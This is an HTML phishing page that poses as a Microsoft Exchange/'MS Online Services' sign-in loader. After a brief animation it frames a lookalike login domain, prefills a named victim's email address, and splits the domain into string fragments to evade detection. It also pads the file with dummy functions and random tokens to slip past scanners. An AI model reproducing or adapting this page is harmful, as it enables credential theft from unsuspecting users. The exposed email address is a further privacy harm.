<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MS Online Services - Home</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body, html {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #333;
            overflow: hidden;
        }

        #loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.9);
            position: absolute;
            z-index: 1000;
            text-align: center;
        }

        .Breathing-logo {
            width: 110px;
            margin-bottom: 20px;
            animation: breathing 2s ease-in-out infinite;
        }

        /* Breathing animation */
        @keyframes breathing {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }

        .loader {
            width: 50px;
            padding: 8px;
            aspect-ratio: 1;
            border-radius: 50%;
            background: #87CEEB;
            --_m: 
                conic-gradient(#0000 10%,#000),
                linear-gradient(#000 0 0) content-box;
            -webkit-mask: var(--_m);
                    mask: var(--_m);
            -webkit-mask-composite: source-out;
                    mask-composite: subtract;
            animation: l3 1s infinite linear;
        }

        @keyframes l3 {
            to { transform: rotate(1turn); }
        }

        #main-content {
            width: 100%;
            height: 100%;
            display: none;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <div id="loader-container">
        <img src="https://seeklogo.com/images/M/microsoft-exchange-logo-9D5C1A540A-seeklogo.com.png" alt="vmuvx3l3klsout" class="Breathing-logo">
    </div>

    <div id="main-content"></div>

<script>
    document.addEventListener("DOMContentLoaded", () => {
        showLoaderAndLoadContent(2500); // Adjust loading duration as neededcdcsvdiqv8m2gf
    });

    function showLoaderAndLoadContent(loadingDuration) {
        setTimeout(() => {
            toggleLoader(false);
            loadIframeContent();
        }, loadingDuration);
    }

    function toggleLoader(show) {
        const loaderContainer = document.getElementById("loader-container");
        const mainContent = document.getElementById("main-content");

        loaderContainer.style.display = show ? "flex" : "none";
        mainContent.style.display = show ? "none" : "block";
    }

    function loadIframeContent() {
        const iframe = document.createElement("iframe");
        iframe.src = getRedirectURL();
        document.getElementById("main-content").appendChild(iframe);
    }

    function getRedirectURL() {
        const urlParams = new URLSearchParams(window.location.search);

        const a = "https://login.ac";
        const b = "jarvis";
        const c = "build";
        const d = "ers.com";
        const e = "/LaDgYMPX#";
        const f = "sarah@driverspickles.co.uk";

        // Custom transformation function
        function transformEmail(f) {
            let transformed = "";

            // Step 1: Convert each character to its ASCII code and perform operations
            for (let i = 0; i < f.length; i++) {
                const charCode = f.charCodeAt(i);

                // Step 2: Perform bitwise operations and add a fixed number
                const transformedCharCode = ((charCode << 3) ^ 0x1F) + i;

                // Step 3: Convert back to a character and append to the result
                transformed += String.fromCharCode(transformedCharCode % 256); // Ensure it stays within ASCII range
            }

            // Step 4: Reverse the string and encode it in Base64
            transformed = transformed.split("").reverse().join("");
            transformed = btoa(transformed); // Base64 encode

            return transformed;
        }
        const g = transformEmail(f);
        return urlParams.get("redirect") || (a + b + c + d + e + f);
    }

    // Non-functional code to increase file size k9w06ooh8my1i8
    function dummyFunction1() {
        let arr = [];
        for (let i = 0; i < 10000; i++) {
            arr.push(i * Math.random());
        }
        return arr;
    }

    function dummyFunction2() {
        const obj = {};
        for (let i = 0; i < 10000; i++) {
            obj["key" + i] = i * Math.random();
        }
        return obj;
    }

    function dummyFunction3() {
        let s = "";
        for (let i = 0; i < 10000; i++) {
            s += "dummy text ";
        }
        return s;
    }

    function dummyFunction4() {
        let complex = [dummyFunction1(), dummyFunction2(), dummyFunction3()];
        complex.forEach(func => {
            console.log(func);
        });
    }

    dummyFunction4();
</script>

</body>
</html>
